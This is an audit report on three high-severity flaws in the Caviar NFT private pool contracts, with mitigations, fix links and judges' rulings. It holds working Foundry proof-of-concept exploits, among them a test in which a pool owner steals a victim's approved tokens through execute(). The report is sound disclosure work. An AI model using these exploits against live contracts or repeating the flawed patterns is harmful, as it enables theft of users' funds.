@@ -1,0 +1,95 @@
+[H-01] Royalty receiver can drain a private pool
+Submitted byVoyvoda, also found byAkshaySrivastav,teddav,aviggiano, andHaipls
+https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L237-L252
+https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L267-L268
+https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L274
+Impact
+Royalty fee calculation has a serious flaw inbuy(...). Caviar’s private pools could be completely drained.
+In the Caviar private pool,NFT royaltiesare being paid from themsg.senderto the NFT royalty receiver of each token in PrivatePool.buy and PrivatePool.sell:
+https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L271-L285
+#buy(uint256[],uint256[],MerkleMultiProof)271:if(payRoyalties) {...274:        (uint256royaltyFee,addressrecipient) =_getRoyalty(tokenIds[i],salePrice);...278:if(baseToken!=address(0)) {279:ERC20(baseToken).safeTransfer(recipient,royaltyFee);280:        }else{281:recipient.safeTransferETH(royaltyFee);282:        }
+https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L328-L352
+#sell(uint256[],uint256[],MerkleMultiProof,IStolenNftOracle.Message[])329:for(uint256i=0;i<tokenIds.length;i++) {...333:if(payRoyalties) {...338:            (uint256royaltyFee,addressrecipient) =_getRoyalty(tokenIds[i],salePrice);...345:if(baseToken!=address(0)) {346:ERC20(baseToken).safeTransfer(recipient,royaltyFee);347:            }else{348:recipient.safeTransferETH(royaltyFee);349:            }
+In both functions, the amount needed to pay all royalties is taken from themsg.senderwho is either the buyer or the seller depending on the context. In PrivatePool.sell, this amount is first paid by the pool and then taken from themsg.senderby simply reducing what they receive in return for the NFTs they are selling. A similar thing is done in PrivatePool.buy, but instead of reducing the output amount, the input amount of base tokens that themsg.sender(buyer) should pay to the pool is increased:
+https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L251-L252
+#buy(uint256[],uint256[],MerkleMultiProof)251:// add the royalty fee amount to the net input aount252:netInputAmount+=royaltyFeeAmount;
+https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L354-L355
+#sell(uint256[],uint256[],MerkleMultiProof,IStolenNftOracle.Message[])354:// subtract the royalty fee amount from the net output amount355:netOutputAmount-=royaltyFeeAmount;
+The difference between these two functions (that lies at the core of the problem) is that in PrivatePool.buy, the_getRoyaltyfunction is called twice. The first time is to calculate the total amount of royalties to be paid, and the second time is to actually send each royalty fee to each recipient:
+https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L242-L248
+https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L273-L274
+#buy(uint256[],uint256[],MerkleMultiProof)242:if(payRoyalties) {243:// get the royalty fee for the NFT244:        (uint256royaltyFee,) =_getRoyalty(tokenIds[i],salePrice);// @audit _getRoyalty called 1st time245:246:// add the royalty fee to the total royalty fee amount247:royaltyFeeAmount+=royaltyFee;248:    }...273:// get the royalty fee for the NFT274:    (uint256royaltyFee,addressrecipient) =_getRoyalty(tokenIds[i],salePrice);// @audit  _getRoyalty called 2nd time
+This is problematic because an attacker could potentially change the royalty fee between the two calls, due to the following untrusted external call:
+https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L267-L268
+#buy(uint256[],uint256[],MerkleMultiProof)267:// refund any excess ETH to the caller268:if(msg.value>netInputAmount)msg.sender.safeTransferETH(msg.value-netInputAmount);// @audit untrusted external call
+If themsg.senderis a malicious contract that has control over theroyaltyFeefor the NFTs that are being bought, they can change it, for example, from 0 basis points (0%) to 10000 basis points (100%) in theirreceive()function.
+https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/common/ERC2981.sol#L94-L99
+// @audit An attacker can call this setter function between the two `_getRoyalty()` calls.94:function_setTokenRoyalty(uint256tokenId,addressreceiver,uint96feeNumerator)internalvirtual{95:require(feeNumerator<=_feeDenominator(),"ERC2981: royalty fee will exceed salePrice");96:require(receiver!=address(0),"ERC2981: Invalid parameters");97:98:_tokenRoyaltyInfo[tokenId] =RoyaltyInfo(receiver,feeNumerator);99:     }
+That way, the amount transferred by themsg.senderfor royalties will be 0 because the totalroyaltyFeeAmountis calculated based on the first value (0%) but the actual sent amount to the receiver is determined by the second value (100%). This will result in the whole price paid for the NFT being returned to the royalty receiver, but being paid by the Pool instead of themsg.sender.
+Themsg.senderhas therefore received the NFT but paid the whole price for it to the royalty receiver and 0 to the Pool. If themsg.senderis the royalty receiver, they will basically have spent 0 base tokens (not counting gas expenses) but received the NFT in their account. They can then sell it to the same private pool to exchange it for base tokens.
+This is an extreme scenario, however, the developers have acknowledged ERC-2981 and thatroyaltyInfo(...)returns an arbitrary address. In the future we could see projects that have royalty payments that fluctuate such as increasing/decaying royalties over timearticle on eip 2981or projects that delegate the creation of nfts to the users such as 1024pixelspolygon,git repoand royalties are paid to each user rather to a single creator. In such cases invocation of_getRoyalty(...)twice with external calls that transfer assets in-between is a vulnerable pattern that is sure to introduce asset risks and calculation inaccuracies both for the users and protocol itself. Immediate remedy would be to simplifybuy(...)inPrivatePool.solto use only onefor loopand call_getRoyalty(...)once.
+PoC shows how the entire Pool’s base tokens can be drained by a single royalty receiver using a single NFT assuming that the royalty receiver has control over the royaltyFee.
+Proof of Concept
+See warden’soriginal submissionfor full Proof of Concept.
+Tools Used
+Foundry
+Recommended Mitigation Steps
+Ensure that the amount sent to the NFT royalty receivers in the secondforloop inbuy()is the same as the amount calculated in the firstforloop.
+Alex the Entreprenerd (judge) commented:
+The Warden has shown how, because of reEntrancy and due to the same call being performed for royalties, a malicious royalty recipient can drain the pool of all funds.I have considered downgrading the finding because of the conditionality of the royalty recipient being malicious, however, I don’t believe this can be considered an external condition, as any account able to change the royalty setting could willingly or unwillingly enable the attack.For this reason I believe that the finding is of High Severity.
+outdoteth (Caviar) confirmed via duplicate issue#593and mitigated:
+Fixed in:https://github.com/outdoteth/caviar-private-pools/pull/12.
+Status:Mitigation confirmed. Full details in reports fromrbserver,KrisApostolov, andrvierdiiev.
+
+[H-02] PrivatePool owner can steal all ERC20 and NFT from user via arbitrary execution
+Submitted byladboy233, also found byElKu,ulqiorra,decade,minhtrng,Koolex,nemveer,said,Norah,giovannidisiena,oxen,JGcarv,JGcarv,Noro,sces60107,Voyvoda,teddav,chaduke,nobody2018,0x4non,sashik_eth,Emmanuel,0xTheC0der, andRuhum
+In the current implementation of the PrivatePool.sol, the function execute is meant to claim airdrop, however, we cannot assume the owner is trusted because anyone can permissionlessly create private pool.
+/// @notice Executes a transaction from the pool account to a target contract. The caller must be the owner of the/// pool. This allows for use cases such as claiming airdrops./// @param target The address of the target contract./// @param data The data to send to the target contract./// @return returnData The return data of the transaction.functionexecute(addresstarget,bytesmemorydata)publicpayableonlyOwnerreturns(bytesmemory) {// call the target with the value and data(boolsuccess,bytesmemoryreturnData) =target.call{value:msg.value}(data);// if the call succeeded return the return dataif(success)returnreturnData;// if we got an error bubble up the error messageif(returnData.length>0) {// solhint-disable-next-line no-inline-assemblyassembly{letreturnData_size:=mload(returnData)revert(add(32,returnData),returnData_size)}}else{revert();}}
+The owner of private pool can easily steal all ERC20 token and NFT from the user’s wallet after the user gives approval to the PrivatePool contract and the user has to give the approval to the pool to let the PrivatePool pull ERC20 token and NFT from the user when user buy or sell or change from EthRouter or directly calling PrivatePool.
+The POC below shows, the owner of the PrivatePool can carefully craft payload to steal funds via arbitrary execution.
+After user’s apporval, the target can be an ERC20 token address or a NFT address, the call data can be the payload of transferFrom or function.
+Please add the code to Execute.t.sol so we can create a mock token:
+contractMyTokenisERC20{constructor()ERC20("MyToken","MTK",18) {}functionmint(addressto,uint256amount)public{_mint(to,amount);}}
+Please add the POC below to Execute.t.sol:
+functiontestStealFundArbitrary_POC()public{MyTokentoken=newMyToken();addressvictim=vm.addr(1040341830);addresshacker=vm.addr(14141231201);token.mint(victim,100000ether);vm.prank(victim);token.approve(address(privatePool),type(uint256).max);console.log("token balance of victim before hack",token.balanceOf(victim));addresstarget=address(token);bytesmemorydata=abi.encodeWithSelector(ERC20.transferFrom.selector,victim,hacker,token.balanceOf(victim));privatePool.execute(target,data);console.log("token balance of victim  after hack",token.balanceOf(victim));}
+We run the POC, the output is:
+PSD:\2023Security\2023-04-caviar>forgetest-vv--match"testStealFundArbitrary_POC"[⠒]Compiling...[⠑]Compiling1fileswith0.8.19[⠃]Solc0.8.19finishedin8.09sCompilerrunsuccessfulRunning1testfortest/PrivatePool/Execute.t.sol:ExecuteTest[PASS]testStealFundArbitrary_POC() (gas:753699)Logs:token balance of victim before hack 100000000000000000000000token balance of victim  after hack 0
+As we can see, the victim’s ERC20 token are stolen.
+Recommended Mitigation Steps
+We recommend the protocol not let the private pool owner perform arbtirary execution. The private pool can use the flashloan to claim the airdrop himself.
+outdoteth (Caviar) confirmed and mitigated:
+Fixed in:https://github.com/outdoteth/caviar-private-pools/pull/2The proposed fix is to revert if execute tries to call thebaseTokenornftcontract. It’s very unlikely a user will approve any other token than these to the pool so this serves as a sufficient check to prevent the stealing outlined in the exploit.if(target==address(baseToken) ||target==address(nft))revertInvalidTarget();
+Alex the Entreprenerd (judge) commented:
+@outdoteth - Wouldn’t the owner be the one owning all of the deposited assets anyway?
+outdoteth (Caviar) commented:
+@GalloDaSballo - The exploit is not about the owner having ownership over owned deposits but rather about stealing non-deposited user funds.For example,Alice wants to sell her Milady 123. She also holds Milady 555 and 111.She approves the PrivatePool to spend all of her Miladies so that she can subsequently call “sell()”The malicious owner of the pool then calls “execute()” multiple times with a payload that calls the Milady contract andtransferFromto transfer all of her Miladies (123, 555, 111) from her walletAlice has now lost all of her Miladies. The same also applies to baseToken approvals when Alice wants to buy some NFTs.The proposed fix is to preventexecute()from being able to call thebaseTokenornftcontracts so that the above example can never occur.
+Alex the Entreprenerd (judge) commented:
+Thank you @outdoteth for clarifying.
+Alex the Entreprenerd (judge) commented:
+The Warden has shown how, because of thesetApprovalForAllpattern, mixed with theexecutefunction, aPrivatePoolmay be used to harvest approvals from users, causing them to lose all tokens.I have considered downgrading the finding because of the Router technically providing a safety check against the pool.However, I believe that the risky pattern of direct approvals to the pool is demonstrated by the pull transfer performed by the FlashLoan function:https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L648-L649ERC721(token).safeTransferFrom(address(receiver),address(this),tokenId);For that call to work, the user / user-contract will have to have approved the pool directly.For this reason I agree with High Severity.
+Status:Mitigation confirmed with comments. Full details in reports fromrbserver,KrisApostolov, andrvierdiiev.
+
+[H-03] Risk of silent overflow in reserves update
+Submitted bysashik_eth, also found bycodeslide,Kaysoft,W0RR1O,georgits,btk,lukris02,0x6980,tnevler,0xAgro,matrix_0wl,catellatech,Sathish9098,ayden,0x4non,adriro,Madalad,Kenshin,giovannidisiena,devscrooge,sayan,SaeedAlipoor01988,tsvetanovv,Cryptor, andmatrix_0wl
+https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L230-L231
+https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L323-L324
+Vulnerability details
+Thebuy()andsell()functions update thevirtualBaseTokenReservesandvirtualNftReservesvariables during each trade. However, these two variables are of typeuint128, while the values that update them are of typeuint256. This means that casting to a lower type is necessary, but this casting is performed without first checking that the values being cast can fit into the lower type. As a result, there is a risk of a silent overflow occurring during the casting process.
+functionbuy(uint256[]calldatatokenIds,uint256[]calldatatokenWeights,MerkleMultiProofcalldataproof)publicpayablereturns(uint256netInputAmount,uint256feeAmount,uint256protocolFeeAmount){// ~~~ Checks ~~~ //// calculate the sum of weights of the NFTs to buyuint256weightSum=sumWeightsAndValidateProof(tokenIds,tokenWeights,proof);// calculate the required net input amount and fee amount(netInputAmount,feeAmount,protocolFeeAmount) =buyQuote(weightSum);...// update the virtual reservesvirtualBaseTokenReserves+=uint128(netInputAmount-feeAmount-protocolFeeAmount);virtualNftReserves-=uint128(weightSum);...
+Impact
+If the reserves variables are updated with a silent overflow, it can lead to a breakdown of the xy=k equation. This, in turn, would result in a totally incorrect price calculation, causing potential financial losses for users or pool owners.
+Proof of Concept
+Consider the scenario with a base token that has high decimals number described in the next test (add it to thetest/PrivatePool/Buy.t.sol):
+functiontest_Overflow()public{// Setting up pool and base token HDT with high decimals number - 30// Initial balance of pool - 10 NFT and 100_000_000 HDTHighDecimalsTokenbaseToken=newHighDecimalsToken();privatePool=newPrivatePool(address(factory),address(royaltyRegistry),address(stolenNftOracle));privatePool.initialize(address(baseToken),nft,100_000_000*1e30,10*1e18,changeFee,feeRate,merkleRoot,true,false);// Minting NFT on pool addressfor(uint256i=100;i<110;i++) {milady.mint(address(privatePool),i);}// Adding 8 NFT ids into the buying arrayfor(uint256i=100;i<108;i++) {tokenIds.push(i);}// Saving K constant (xy) value before the tradeuint256kBefore=uint256(privatePool.virtualBaseTokenReserves()) *uint256(privatePool.virtualNftReserves());// Minting enough HDT tokens and approving them for pool address(uint256netInputAmount,,uint256protocolFeeAmount) =privatePool.buyQuote(8*1e18);deal(address(baseToken),address(this),netInputAmount);baseToken.approve(address(privatePool),netInputAmount);privatePool.buy(tokenIds,tokenWeights,proofs);// Saving K constant (xy) value after the tradeuint256kAfter=uint256(privatePool.virtualBaseTokenReserves()) *uint256(privatePool.virtualNftReserves());// Checking that K constant succesfully was changed due to silent overflowassertEq(kBefore,kAfter,"K constant was changed");}
+Also add this contract into the end ofBuy.t.solfile for proper test work:
+contractHighDecimalsTokenisERC20{constructor()ERC20("High Decimals Token","HDT",30) {}}
+Recommended Mitigation Steps
+Add checks that the casting value is not greater than theuint128type max value:
+File:PrivatePool.sol229:// update the virtual reserves+if(netInputAmount-feeAmount-protocolFeeAmount>type(uint128).max)revertOverflow();230:virtualBaseTokenReserves+=uint128(netInputAmount-feeAmount-protocolFeeAmount);+if(weightSum>type(uint128).max)revertOverflow();231:virtualNftReserves-=uint128(weightSum);File:PrivatePool.sol322:// update the virtual reserves+if(netOutputAmount+protocolFeeAmount+feeAmount>type(uint128).max)revertOverflow();323:virtualBaseTokenReserves-=uint128(netOutputAmount+protocolFeeAmount+feeAmount);+if(weightSum>type(uint128).max)revertOverflow();324:virtualNftReserves+=uint128(weightSum);
+outdoteth (Caviar) acknowledged
+Alex the Entreprenerd (judge) commented:
+The Warden has identified a risky underflow due to unsafe casting, the underflow would cause the invariants of the protocol to be broken, causing it to behave in undefined ways, most likely allowing to discount tokens (principal)I have considered downgrading to Medium SeverityHowever, I believe that in multiple cases the subtractionsnetInputAmount - feeAmount - protocolFeeAmountwhich could start withnetInputAmount > type(uint128).maxwould not necessarily fall within auint128For this reason, I believe the finding to be of High Severity.
+outdoteth (Caviar) mitigated:
+Fixed inhttps://github.com/outdoteth/caviar-private-pools/pull/10.
+Status:Mitigation confirmed. Full details in reports fromrbserver,KrisApostolov, andrvierdiiev.
+
